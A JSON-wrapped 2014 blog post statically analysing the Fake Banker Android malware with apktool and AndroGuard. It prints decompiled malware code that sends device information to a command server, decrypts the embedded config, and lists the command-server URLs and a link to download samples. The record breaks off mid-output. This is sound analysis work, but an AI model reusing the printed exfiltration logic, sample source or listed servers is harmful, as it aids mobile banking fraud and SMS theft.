{
    "id": "0335edfb-46ee-453c-a17c-33de04ffeda8",
    "created_at": "2023-01-12T15:04:58.160454Z",
    "updated_at": "2025-03-27T02:16:26.459701Z",
    "deleted_at": null,
    "sha1_hash": "efe80ea9f58382f28bbec8e863f3524cc183d853",
    "title": "2014-07-07 - Disect Android APKs like a Pro - Static code analysis",
    "authors": "",
    "file_creation_date": "2022-05-27T23:25:24Z",
    "file_modification_date": "2022-05-27T23:25:24Z",
    "file_size": 1278648,
    "plain_text": "# Disect Android APKs like a Pro - Static code analysis\n\n**[blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/](http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/)**\n\nJuly 7, 2014\n\n#### I’ve started writing this IPython notebook in order to make myself more comfortable with Android and its SDK. Due to some personal interests I thought I could also have a look at the available RE tools and learn more about their pros & cos. In particular I had a closer look at AndroGuard which seems to be good at:\n\n Reverse engineering, Malware and goodware analysis of Android applications … and more (ninja !)\n\n I was charmed but its capabilities and the pythonic art of handling with APKs. In the 2nd step I’ve needed a malware to play it, so I had a look at Contagio Mobile. There I’ve randomly chosen a malware and got stucked with Fake Banker. There are some technical details about the malware itself gained during automated tests which can be read here.\n\n This article will only deal with the static source code analysis of the malware. A 2nd part dedicated to the dynamic analysis is planed as well.\n\n### Start Kali Linux\n\n#### Stay safe and run the stuff isolated:\n\n➜ ~ virsh -c qemu:///system\n```\nWelcome to virsh, the virtualization interactive terminal.\nType: 'help' for help with commands\n    'quit' to quit\nvirsh # \nvirsh # list --all\n Id  Name              State\n--------------------------------------------------- 2   Ubuntu.GitLab         running\n -   Linux.Kali           shut off\n -   Ubuntu.Tracks         shut off\n -   Windows7            shut off\nvirsh # start Linux.Kali\nDomain Linux.Kali started\n\n#### Now we’re ready to login:\n\n```\n\n-----\n\n➜  ssh kali.local\n```\nvictor@kali.local's password: \nLinux kali 3.7-trunk-amd64 #1 SMP Debian 3.7.2-0+kali8 x86_64\nThe programs included with the Kali GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\nKali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\n\n### Install SDK\n(env)root@kali:~/work/apk/SDK# wget http://dl.google.com/android/android-sdk_r22.6.2linux.tgz\n(env)root@kali:~/work/apk/SDK# tar -zxf android-sdk_r22.6.2-linux.tgz\n(env)root@kali:~/work/apk/SDK# export PATH=$PATH:/root/work/apk/SDK/android-sdklinux/tools(env)root@kali:~/work/apk/SDK# which monitor\n/root/work/apk/SDK/android-sdk-linux/tools/monitor\n\n#### Make sure you have the ia32-libs installed.\n\n### Setup PATH\nimport os\nimport sys\n# Adjust PYTHONPATH\nsys.path.append(os.path.expanduser('~/work/bin/androguard'))\n# Setup new PATH\nold_path = os.environ['PATH']\nnew_path = old_path + \":\" + \"/root/work/apk/SDK/android-sdklinux/tools:/root/work/apk/SDK/android-sdk-linux/platformtools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0\"\nos.environ['PATH'] = new_path\n# Change working directory\nos.chdir(\"/root/work/apk/\")\n\n Setup IPython settings\n%pylab inline\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport networkx as nx\nfrom IPython.display import display_pretty, display_html, display_jpeg, display_png,\ndisplay_json, display_latex, display_svg\n# Androguard stuff\nimport androlyze as anz\n#import corae bytecodes dvm as dvm\n\n```\n\n-----\n\n```\nPopulating the interactive namespace from numpy and matplotlib\n\n## Get malicious APKs\n\n#### Now that you got everything running it’s time to get some malicious APKs to play with. On contagio mobile you’ll get tons of malicious files to look at. I’ve decided to look at the Fake Banker:\n(env)root@kali:~/work/apk/DroidBox/APK# wget\nhttp://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip\n\n Now you’ll have to extract the archive. As mentioned on the site you’ll have to contact the sites maintainer in order to get the password for the files. Thanks to @snowfl0w for providing me the password.\n\n NOTE: The ordinary unzip command will fail to extract the files. You should install p7zip.\n(env)root@kali:~/work/apk/DroidBox/APK# 7z e FakeBankerAPKs.zip \n7-Zip [64] 9.20 Copyright (c) 1999-2010 Igor Pavlov 2010-11-18\np7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU)\nProcessing archive: FakeBankerAPKs.zip\nExtracting 7276e76298c50d2ee78271cf5114a176\nEnter password (will not be echoed) :\nExtracting a15b704743f53d3edb9cdd1182ca78d1\nExtracting aac4d15741abe0ee9b4afe78be090599\nEverything is Ok\nFiles: 3\nSize:    629877\nCompressed: 622336\n\n## Scratch the surface\n\n#### In this section we’ll have a brief look at the APK(s):\n\n Which files does the APK contain? How is the APK built? Can we find some vital information e.g. permissions the APK will have when installed on the device? What about other ressources?\n# Change CWD\nos.chdir(\"/root/work/apk/DroidBox/APK\")\n\n```\n\n-----\n\n### Check APKs contents\n```\n%%bash\nfor i in *; do file $i; done\n7276e76298c50d2ee78271cf5114a176: Zip archive data, at least v2.0 to extract\na15b704743f53d3edb9cdd1182ca78d1: Zip archive data, at least v2.0 to extract\naac4d15741abe0ee9b4afe78be090599: Zip archive data, at least v2.0 to extract\n\n Zippped files\n%%bash\nunzip -l 7276e76298c50d2ee78271cf5114a176\nArchive: 7276e76298c50d2ee78271cf5114a176\nsigned by SignApk\n Length   Date  Time  Name\n--------- ---------- -----  ---   1119 2008-02-29 05:33  META-INF/MANIFEST.MF\n   1172 2008-02-29 05:33  META-INF/CERT.SF\n   1714 2008-02-29 05:33  META-INF/CERT.RSA\n   5004 2008-02-29 05:33  AndroidManifest.xml\n  394740 2008-02-29 05:33  classes.dex\n   6426 2008-02-29 05:33  res/drawable-hdpi/ic_launcher1.png\n  14738 2008-02-29 05:33  res/drawable-hdpi/logo.png\n   2052 2008-02-29 05:33  res/drawable-ldpi/ic_launcher1.png\n   3231 2008-02-29 05:33  res/drawable-mdpi/ic_launcher1.png\n   8824 2008-02-29 05:33  res/drawable-xhdpi/ic_launcher1.png\n   1012 2008-02-29 05:33  res/layout/actup.xml\n   620 2008-02-29 05:33  res/layout/main.xml\n   4200 2008-02-29 05:33  res/layout/main2.xml\n   432 2008-02-29 05:33  res/menu/main.xml\n    56 2008-02-29 05:33  res/raw/blfs.key\n   1048 2008-02-29 05:33  res/raw/config.cfg\n   3196 2008-02-29 05:33  resources.arsc\n---------           ------  449584           17 files\n\n## Dump APKs content with apktool\n%%bash\ncp 7276e76298c50d2ee78271cf5114a176 FakeBanker.apk\njava -jar /root/work/bin/apktool1.5.2/apktool.jar d 7276e76298c50d2ee78271cf5114a176\noutput\nDestination directory (/root/work/apk/DroidBox/APK/output) already exists. Use -f\nswitch if you want to overwrite it.\n\n### AndroidManifest.xml\n%%bash\ncat output/AndroidManifest.xml\n\n```\n\n-----\n\n```\n<?xml version 1.0 encoding utf 8 ?>\n<manifest android:versionCode=\"1\" android:versionName=\"1.0\" package=\"com.gmail.xpack\"\n xmlns:android=\"http://schemas.android.com/apk/res/android\">\n  <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\" />\n  <uses-permission android:name=\"android.permission.READ_SMS\" />\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\" />\n  <uses-permission android:name=\"android.permission.INTERNET\" />\n  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\" />\n  <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n  <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" />\n  <application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\"\nandroid:icon=\"@drawable/ic_launcher1\" android:debuggable=\"true\"\nandroid:allowBackup=\"false\">\n    <activity android:label=\"@string/app_name\"\nandroid:name=\"com.gmail.xpack.MainActivity\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.MAIN\" />\n        <category android:name=\"android.intent.category.LAUNCHER\" />\n      </intent-filter>\n    </activity>\n    <service android:name=\"com.gmail.xservices.XService\"\nandroid:exported=\"false\">\n      <intent-filter>\n        <action android:name=\"XMainProcessStart\" />\n      </intent-filter>\n    </service>\n    <service android:name=\"com.gmail.xservices.XSmsIncom\" />\n    <receiver android:name=\"com.gmail.xbroadcast.OnBootReceiver\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n      </intent-filter>\n    </receiver>\n    <receiver android:name=\"com.gmail.xbroadcast.MessageReceiver\">\n      <intent-filter android:priority=\"999\">\n        <action android:name=\"android.provider.Telephony.SMS_RECEIVED\" />\n      </intent-filter>\n    </receiver>\n    <receiver android:name=\"com.gmail.xservices.XRepeat\"\nandroid:process=\":remote\" />\n    <receiver android:name=\"com.gmail.xservices.XUpdate\"\nandroid:process=\":remote\" />\n    <activity android:name=\"ActUpdate\">\n      <intent-filter>\n        <action android:name=\"com.gmail.xpack.updateact\" />\n        <category android:name=\"android.intent.category.DEFAULT\" />\n      </intent-filter>\n    </activity>\n  </application>\n</manifest>\n\n### Check for media\n\n```\n\n-----\n\n```\nmedia_paths !find output regextype posix egrep regex . \\.\n(png|jpg|jpeg|gif|bmp)$\"\ndisplay(media_paths)\nfor p in media_paths:\n  display(Image(filename=p))\n['output/res/drawable-ldpi/ic_launcher1.png',\n 'output/res/drawable-mdpi/ic_launcher1.png',\n 'output/res/drawable-xhdpi/ic_launcher1.png',\n 'output/res/drawable-hdpi/logo.png',\n 'output/res/drawable-hdpi/ic_launcher1.png']\n\n### Directory structure\n%%bash\n# Ignore smali directory\ntree -f -I \"smali\" output/\n\n```\n\n-----\n\n```\noutput\n├── output/AndroidManifest.xml\n├── output/apktool.yml\n└── output/res\n  ├── output/res/drawable-hdpi\n  │  ├── output/res/drawable-hdpi/ic_launcher1.png\n  │  └── output/res/drawable-hdpi/logo.png\n  ├── output/res/drawable-ldpi\n  │  └── output/res/drawable-ldpi/ic_launcher1.png\n  ├── output/res/drawable-mdpi\n  │  └── output/res/drawable-mdpi/ic_launcher1.png\n  ├── output/res/drawable-xhdpi\n  │  └── output/res/drawable-xhdpi/ic_launcher1.png\n  ├── output/res/layout\n  │  ├── output/res/layout/actup.xml\n  │  ├── output/res/layout/main2.xml\n  │  └── output/res/layout/main.xml\n  ├── output/res/menu\n  │  └── output/res/menu/main.xml\n  ├── output/res/raw\n  │  ├── output/res/raw/blfs.key\n  │  └── output/res/raw/config.cfg\n  └── output/res/values\n    ├── output/res/values/ids.xml\n    ├── output/res/values/public.xml\n    ├── output/res/values/strings.xml\n    └── output/res/values/styles.xml\n9 directories, 17 files\n\n### First findings\n\n#### Having a look at the AndroidManifest.xml file itself you can see that we have a MessageReceiver with a quite high priority:\n <receiver android:name=\"com.gmail.xbroadcast.MessageReceiver\">\n      <intent-filter android:priority=\"999\">\n        <action android:name=\"android.provider.Telephony.SMS_RECEIVED\" />\n      </intent-filter>\n </receiver>\n\n That looks very suspicious as well. What about the main entry point:\n <activity android:label=\"@string/app_name\"\nandroid:name=\"com.gmail.xpack.MainActivity\">\n      <intent-filter>\n        <action android:name=\"android.intent.action.MAIN\" />\n        <category android:name=\"android.intent.category.LAUNCHER\" />\n      </intent-filter>\n </activity>\n\n```\n\n-----\n\n#### So obviously the class com.gmail.xpack.MainActivity contains the main entry point. In the next steps we will have a closer look at the code. Besides that there are 2 files which might be interesting:\n```\n   output/res/raw/blfs.key\n   output/res/raw/config.cfg\n\n## Static code analysis using AndroGuard\n# Use AndroGuard to static analysis\n# Have a look at https://code.google.com/p/androguard/wiki/RE for some introduction\n#a = anz.APK('KC.apk')\na, d, dx = anz.AnalyzeAPK('FakeBanker.apk',decompiler='dex2jar')\n\"\"\"\nd = anz.DalvikVMFormat(a.get_dex())\ndx = anz.VMAnalysis( d )\ngx = anz.GVMAnalysis( dx, None )\nd.set_vmanalysis( dx )\nd.set_gvmanalysis( gx )\n\"\"\"\n'\\nd = anz.DalvikVMFormat(a.get_dex())\\ndx = anz.VMAnalysis( d )\\ngx =\nanz.GVMAnalysis( dx, None )\\nd.set_vmanalysis( dx )\\nd.set_gvmanalysis( gx )\\n'\n\n### Analyze the manifest file\na.files\n{'AndroidManifest.xml': 'Unknown',\n 'META-INF/CERT.RSA': 'Unknown',\n 'META-INF/CERT.SF': 'Unknown',\n 'META-INF/MANIFEST.MF': 'Unknown',\n 'classes.dex': 'Unknown',\n 'res/drawable-hdpi/ic_launcher1.png': 'Unknown',\n 'res/drawable-hdpi/logo.png': 'Unknown',\n 'res/drawable-ldpi/ic_launcher1.png': 'Unknown',\n 'res/drawable-mdpi/ic_launcher1.png': 'Unknown',\n 'res/drawable-xhdpi/ic_launcher1.png': 'Unknown',\n 'res/layout/actup.xml': 'Unknown',\n 'res/layout/main.xml': 'Unknown',\n 'res/layout/main2.xml': 'Unknown',\n 'res/menu/main.xml': 'Unknown',\n 'res/raw/blfs.key': 'Unknown',\n 'res/raw/config.cfg': 'Unknown',\n 'resources.arsc': 'Unknown'}\na.permissions\n\n```\n\n-----\n\n```\n[ android.permission.RECEIVE_BOOT_COMPLETED,\n 'android.permission.READ_SMS',\n 'android.permission.RECEIVE_SMS',\n 'android.permission.INTERNET',\n 'android.permission.READ_PHONE_STATE',\n 'android.permission.ACCESS_COARSE_LOCATION',\n 'android.permission.ACCESS_NETWORK_STATE']\na.get_activities()\n['com.gmail.xpack.MainActivity', 'com.gmail.xpack.ActUpdate']\na.get_services()\n['com.gmail.xservices.XService', 'com.gmail.xservices.XSmsIncom']\na.get_receivers()\n['com.gmail.xbroadcast.OnBootReceiver',\n 'com.gmail.xbroadcast.MessageReceiver',\n 'com.gmail.xservices.XRepeat',\n 'com.gmail.xservices.XUpdate']\na.get_main_activity()\nu'com.gmail.xpack.MainActivity'\nd.CLASS_Lcom_gmail_xpack_MainActivity.METHOD_onCreate.source()\n  protected void onCreate(android.os.Bundle p5)\n  {\n    super.onCreate(p5);\n    this.setContentView(1.741289080126432e+38);\nthis.show_hide(Integer.valueOf(com.gmail.xlibs.myFunctions.getVar(\"PASSADDED\", 0,\nthis)));\n    com.gmail.xlibs.myFunctions.sendLog(\"START\", \"Service started\", this);\n    this.startService(new\nandroid.content.Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n    return;\n  }\n\n#### Ok let’s have a look at com.gmail.xlibs.myFunctions:\nmethods = d.CLASS_Lcom_gmail_xlibs_myFunctions.get_methods()\nfor m in methods: print(m.get_name())\n\n```\n\n-----\n\n```\n<init>\nIntToStr\nStrToInt\ncheckPhone\ndeviceInfo\nfoundCodeInSms\ngetCheckedURL\ngetFirst\ngetRawData\ngetSecond\ngetVar\ngetVar\nin_array\nisOnline\nloadNumFromPreferences\nparseXml\nsendFromDb\nsendLog\nsendMessge\nsetK12\nsetVar\nsetVar\nsetVarsList\ntypeInternetConnection\n\n#### Having a look at the whole class you can see that there are a lot of methods. But this one looks very interesting:\nd.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_setK12.source()\n  public static String setK12(String p4, android.content.Context p5)\n  {\n    String v2;\n    String v1 = com.gmail.xlibs.myFunctions.getVar(\"BLFSK\", \"\", p5);\n    if (v1.length() <= 0) {\n      v2 = \"\";\n    } else {\n      v2 = new com.gmail.xlibs.Blowfish(v1, \"base64\", \"12345678\").encrypt(p4);\n    }\n    return v2;\n  }\n\n## Decrypting stuff\n\n#### Apparently there is an encryption routine (Blowfish) used for some stuff. In this case a new class v2 is initialized. The constructor gets several parameters:\n\n content of BLFSK ( v1 ) base64 (I thing this sort of flag) “1234578” (Looks like some IV)\n\n Let’s have a look at the Blowfish class:\n\n```\n\n-----\n\n```\nd.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_init.source()\n  public Blowfish(String p2, String p3, String p4)\n  {\n    this.IV = \"12345678\";\n    this.in_out_format = \"clear\";\n    this.IV = p4;\n    this.strkey = p2;\n    this.in_out_format = p3;\n    return;\n  }\np2 (the first argument) is the key. Looking one step before let’s find out what’s inside the\nBLFSK variable. First let’s see where the variable is beeing used:\nz = dx.tainted_variables.get_string(\"BLFSK\")\nif z: z.show_paths(d)\nR 62 Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V\nR 17c Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V\nR e8 Lcom/gmail/xlibs/myFunctions;->getSecond (Landroid/content/Context;)V\nR 0 Lcom/gmail/xlibs/myFunctions;->setK12 (Ljava/lang/String;\nLandroid/content/Context;)Ljava/lang/String;\n\n#### Let’s search for some content/files:\n%%bash\nfind output -name \"blfs*\"\noutput/res/raw/blfs.key\n%%bash\ncat output/res/raw/blfs.key\nNfvnkjlnvkjKCNXKDKLFHSKD:LJmdklsXKLNDS:<XObcniuaebkjxbcz\n\n Well that looks like a key to me :). What else can we find inside output/res/raw :\n%%bash\nls -l output/res/raw\ntotal 8\n-rw-r--r-- 1 root root  56 Jun 25 13:26 blfs.key\n-rw-r--r-- 1 root root 1048 Jun 25 13:26 config.cfg\n%%bash\ncat output/res/raw/config.cfg\nHoBbgAt+xT9vXJUlyhYYAVOx5Oy4XSMLyc7JC+ly5a1tbUtWvFMny2yqavP9D9GT0ogg2U4LN5FZE8/0Y2duLg\n\n I’ve checked that content and it’s base64:\n\n```\n\n-----\n\n```\n%%bash\nbase64 -d output/res/raw/config.cfg > output/res/raw/config.cfg.raw\nfile output/res/raw/config.cfg.raw\noutput/res/raw/config.cfg.raw: data\n\n#### Ok. Now let’s decrypt that file. But first let’s have a look at the used encryption parameters:\nd.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_encrypt.source()\n  public String encrypt(String p10)\n  {\n    try {\n      String v7;\n      javax.crypto.spec.SecretKeySpec v6 = new\njavax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), \"Blowfish\");\n      javax.crypto.Cipher v0 =\njavax.crypto.Cipher.getInstance(\"Blowfish/CBC/PKCS5Padding\");\n      v0.init(1, v6, new\njavax.crypto.spec.IvParameterSpec(this.IV.getBytes()));\n      byte[] v3 = v0.doFinal(p10.getBytes());\n    } catch (Exception v1) {\n      v7 = 0;\n      return v7;\n    }\n    if (this.in_out_format != \"base64\") {\n      if (this.in_out_format != \"hex\") {\n        v7 = new String(v3, \"UTF8\");\n      } else {\n        v7 = com.gmail.xlibs.Blowfish.byte2hex(v3);\n      }\n    } else {\n      v7 = android.util.Base64.encodeToString(v3, 0);\n    }\n    return v7;\n  }\n\n So we have Blowfish with CBC. The decryption method:\nd.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_decrypt.source()\n\n```\n\n-----\n\n```\n  public String decrypt(String p9)\n  {\n    try {\n      byte[] v1;\n      javax.crypto.spec.SecretKeySpec v5 = new\njavax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), \"Blowfish\");\n      javax.crypto.Cipher v0 =\njavax.crypto.Cipher.getInstance(\"Blowfish/CBC/PKCS5Padding\");\n      v0.init(2, v5, new\njavax.crypto.spec.IvParameterSpec(this.IV.getBytes()));\n    } catch (Exception v2) {\n      byte[] v6 = 0;\n      return v6;\n    }\n    if (this.in_out_format != \"base64\") {\n      if (this.in_out_format != \"hex\") {\n        v1 = v0.doFinal(p9.getBytes(\"UTF8\"));\n      } else {\n        v1 = v0.doFinal(com.gmail.xlibs.Blowfish.hex2byte(p9));\n      }\n    } else {\n      v1 = v0.doFinal(android.util.Base64.decode(p9, 0));\n    }\n    v6 = new String(v1);\n    return v6;\n  }\n\n#### As I’ve looked into the code I’ve noticed that a new Blowfish class is initiated in com/xlibs/myFunctions.class.\nd.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getFirst.source()\n\n```\n\n-----\n\n```\n  public static void getFirst(android.content.Context p14)\n  {\n    if (com.gmail.xlibs.myFunctions.getVar(\"RID\", 0, p14) == 0) {\n      String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38,\n0, p14);\n      com.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5,\n\"base64\",\n\"12345678\").decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1,\np14)), p14);\n      int v0 = com.gmail.xlibs.myFunctions.getVar(\"RID\", 0, p14);\n      if (v0 != 0) {\n        com.gmail.xlibs.myFunctions.setVar(\"BLFSK\", v5, p14);\n        com.gmail.xlibs.myFunctions.setVar(\"RID\", v0, p14);\n        String v9 = com.gmail.xlibs.myFunctions.getVar(\"USE_URL_MAIN\", \"\",\np14);\n        if (v9.trim().length() > 0) {\n          String[] v7 = new String[3];\n          v7[0] = \"data\";\n          v7[1] = \"rid\";\n          v7[2] = \"first\";\n          String[] v10 = new String[3];\n          v10[0] =\ncom.gmail.xlibs.Blowfish.base64_encode(com.gmail.xlibs.myFunctions.deviceInfo(p14));\n          v10[1] =\ncom.gmail.xlibs.myFunctions.IntToStr(com.gmail.xlibs.myFunctions.getVar(\"RID\", 0,\np14));\n          v10[2] = \"true\";\n          try {\n            String v8 = com.gmail.xlibs.SimpleCurl.httpPost(v9,\ncom.gmail.xlibs.SimpleCurl.prepareVars(v7, v10, \"UTF-8\"), \"UTF-8\");\n          } catch (java.io.IOException v4) {\n            com.gmail.xlibs.myFunctions.setVar(\"RID\", 0, p14);\n            v4.printStackTrace();\n          } catch (java.io.IOException v4) {\n            com.gmail.xlibs.myFunctions.setVar(\"RID\", 0, p14);\n            v4.printStackTrace();\n          }\n          v8 = v8.trim();\n          if ((v8 != null) && (v8.length() != 0)) {\n            com.gmail.xlibs.myFunctions.setVar(\"BLFSK\", v8, p14);\n          } else {\n            com.gmail.xlibs.myFunctions.setVar(\"RID\", 0, p14);\n            android.util.Log.d(\"HTTP\", \"Obnilim rid\");\n          }\n        }\n      }\n    }\n    return;\n  }\n\n#### Especially this line is very interesting:\ncom.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5, \"base64\",\n\"12345678\").decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1,\np14)), p14);\n\n```\n\n-----\n\n#### Obviously the encrypted file has some XML content which has to be parsed first. The parseXML function requires a String parameter containing the XML code. The XML code has to be first decrypted:\n```\nnew com.gmail.xlibs.Blowfish(v5, \"base64\", \"12345678\")\n\n This will create a new Blowfish object where the parameters are set as shown below:\n\n```\n```\nv5\n\n```\n\n#### String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 0, p14);\n\n```\nbase64\n\n```\n\n#### Format of ciphertext to be decrypted\n\n```\n12345678\n\n```\n\n#### The IV used for the Blowfish cipher\n```\nv5 contains the encryption key. This is have to be loaded first using getRawData . Let’s\n\n have a look at it:\nd.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getRawData.source()\n  public static String getRawData(int p9, int p10, android.content.Context p11)\n  {\n    java.io.InputStream v4 = p11.getResources().openRawResource(p9);\n    java.io.ByteArrayOutputStream v0 = new java.io.ByteArrayOutputStream();\n    try {\n      int v3 = v4.read();\n    } catch (java.io.IOException v2) {\n      v2.printStackTrace();\n      String v6;\n      String v5 = v0.toString();\n      if (p10 != 0) {\n        v6 = v5;\n      } else {\n        v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0,\n50);\n      }\n      return v6;\n    }\n    while (v3 != -1) {\n      v0.write(v3);\n      v3 = v4.read();\n    }\n    v4.close();\n  }\n\n The first argument p9 is a shared preference and contains the name of the file the content should be read from. Using another decompiler l I had a look at the getFirst method and found this:\n\n```\n\n-----\n\n```\n...\nString str1 = getRawData(2130968576, 0, paramContext);\nString str2 = getRawData(2130968577, 1, paramContext);\nparseXml(new Blowfish(str1, \"base64\", \"12345678\").decrypt(str2), paramContext);\n...\n\n#### Now what are those numbers: 2130968576 and 2130968577? Those are ressource identifier. If we hex them we’ll have:\nhex(2130968576) = 7f040000 and \nhex(2130968577) = 7f040001\n\n Let’s search the files for this pattern:\n%%bash\ngrep -r \"7f040000\" output/* && grep -r \"7f040001\" output/*\noutput/res/values/public.xml:  <public type=\"raw\" name=\"blfs\" id=\"0x7f040000\" />\noutput/smali/com/gmail/xpack/R$raw.smali:.field public static final blfs:I =\n0x7f040000\noutput/res/values/public.xml:  <public type=\"raw\" name=\"config\" id=\"0x7f040001\" />\noutput/smali/com/gmail/xlibs/myFunctions.smali:  const v11, 0x7f040001\noutput/smali/com/gmail/xpack/R$raw.smali:.field public static final config:I =\n0x7f040001\n\n So those numbers are indeed ressources. What kind of?\n%%bash\ngrep \"7f04000\" output/smali/com/gmail/xpack/R\\$raw.smali\n.field public static final blfs:I = 0x7f040000\n.field public static final config:I = 0x7f040001\n\n Bingo! Now we know that:\n2130968576 -> 7f040000 -> blfs.key\n2130968577 -> 7f040000 -> blfs.cfg\n\n So let’s summarize some things:\n\n getFirst() calls getRawData twice\n 1. getRawData(\"blfs.key\", 0, paramContext); 2. getRawData(\"config.cg\", 1, paramContext);\n\n In getRawData() there is no magic happing: Some file stream is created and then the conten is read. BUT: There is one catch about it:\nif (p10 != 0) {\n   v6 = v5;\n} else {\n  v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0, 50);\n}\n\n```\n\n-----\n\n```\np10 is the 2nd argument given to getRawData. If you pay attention you may notice that if\np10 == 1 nothing special will happen. Otherwise (content of blfs.key is read out) there are\n\n#### some string manipulations taking place. This took me a while to notice it and was the reason I couldn’t decrypt the config.cfg. This is what it does with the content of blfs.key :\n\n convert string to byte array convert byte array to hex string take only the first 50 bytes\n\n In the end v6 will contain the decryption key. Using PyCrypto we’ll try to decrypt the content in Python:\nfrom Crypto.Cipher import Blowfish\nfrom Crypto import Random\nfrom struct import pack\nfrom binascii import hexlify, unhexlify\n# Read content from files\nblfs_key = !cat output/res/raw/blfs.key\nciphertext_base64 = !cat output/res/raw/config.cfg\nciphertext_raw = ciphertext_base64[0].decode(\"base64\")\n# Some settings\nIV = \"12345678\"\n_KEY = blfs_key[0]\nciphertext = ciphertext_raw\n# As seen in the source code: \n# * hex-encode the blfs key\n# * take only the substring[0:50]\nKEY = hexlify(_KEY)[:50]\n# Do the decryption\ncipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)\nmessage = cipher.decrypt(ciphertext)\nmessage\n'<?xml version=\"1.0\" encoding=\"utf-8\"?>\\n     <config>\\n      <data\nrid=\"25\" \\n         shnum10=\"\" shtext10=\"\" shnum5=\"\" shtext5=\"\" shnum3=\"\"\nshtext3=\"\" shnum1=\"\" shtext1=\"\" \\n         del_dev=\"0\" \\n         \nurl_main=\"http://best-invest-int.com/gallery/3.php;http://citroenclub.ch/images/3.php\" \\n         url_data=\"http://best-investint.com/gallery/1.php;http://citroen-club.ch/images/1.php\" \\n         \nurl_sms=\"http://best-invest-int.com/gallery/2.php;http://citroenclub.ch/images/2.php\"\\n         url_log=\"http://best-investint.com/gallery/4.php;http://citroen-club.ch/images/4.php\"\\n         \ndownload_domain=\"certificates-security.com\"\\n         ready_to_bind=\"0\" />\\n\n\\n     </config>\\x05\\x05\\x05\\x05\\x05'\n\n Yeay! Now a more structured look at the XML:\n\n```\n\n-----\n\n```\nfrom lxml import etree\nimport xml.etree.ElementTree as ET\n# Remove dirty characters\nxml = message.replace(\"\\x05\", \"\").replace(\"\\n\", \"\")\n# Create XML tree from string\nroot = etree.XML(xml)\ndata = root.xpath(\"/config//data\")\nframe = []\n# Get data\nfor sample in data:\n  for attr_name, attr_value in sample.items():\n    values = attr_value.split(\";\")\n    for v in values:\n      frame.append((attr_name, v))\n# Show attributes found in /config/data\ndf = pd.DataFrame(frame, columns=['Attribute', 'Value'])\ndf\n\n#### Attribute Value\n\n 0 rid 25\n\n 1 shnum10\n\n 2 shtext10\n\n 3 shnum5\n\n 4 shtext5\n\n 5 shnum3\n\n 6 shtext3\n\n 7 shnum1\n\n 8 shtext1\n\n 9 del_dev 0\n\n 10 url_main http://best-invest-int.com/gallery/3.php\n\n 11 url_main http://citroen-club.ch/images/3.php\n\n 12 url_data http://best-invest-int.com/gallery/1.php\n\n 13 url_data http://citroen-club.ch/images/1.php\n\n 14 url_sms http://best-invest-int.com/gallery/2.php\n\n```\n\n-----\n\n#### Attribute Value\n\n 15 url_sms http://citroen-club.ch/images/2.php\n\n 16 url_log http://best-invest-int.com/gallery/4.php\n\n 17 url_log http://citroen-club.ch/images/4.php\n\n 18 download_domain certificates-security.com\n\n 19 ready_to_bind 0\n\n## Inspect malwares config\n\n#### Looks interesting. Are those URLs still available?\n```\nimport urllib2\n# Get URLs from DataFrame (only the valid ones)\nurls = df['Value'][10:19].tolist()\n#urls = [\"http://google.de/\", \"http://blog.dornea.nu/about\"]\nresp = {}\ndef get_status_code(host, path=\"/\"):\n  \"\"\" This function retreives the status code of a website by requesting\n    HEAD data from the host. This means that it only requests the headers.\n    If the host cannot be reached or something else goes wrong, it returns\n    None instead.\n  \"\"\"\n  try:\n    conn = httplib.HTTPConnection(host)\n    conn.request(\"HEAD\", path)\n    return conn.getresponse().getheaders()\n  except StandardError:\n    return None\n# Iterate through URLs\nfor u in urls:\n  p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*)/(?P<path>.*)'\n  m = re.search(p, u)\n  if m:\n    status_code = get_status_code(m.group('host'), \"/\" + m.group('path'))\n    resp[u] = status_code\nresp\n\n```\n\n-----\n\n```\n{ http://best invest int.com/gallery/1.php : None,\n 'http://best-invest-int.com/gallery/2.php': None,\n 'http://best-invest-int.com/gallery/3.php': None,\n 'http://best-invest-int.com/gallery/4.php': None,\n 'http://citroen-club.ch/images/1.php': [('date',\n  'Fri, 04 Jul 2014 08:31:12 GMT'),\n ('content-type', 'text/html; charset=iso-8859-1'),\n ('server', 'Apache')],\n 'http://citroen-club.ch/images/2.php': [('date',\n  'Fri, 04 Jul 2014 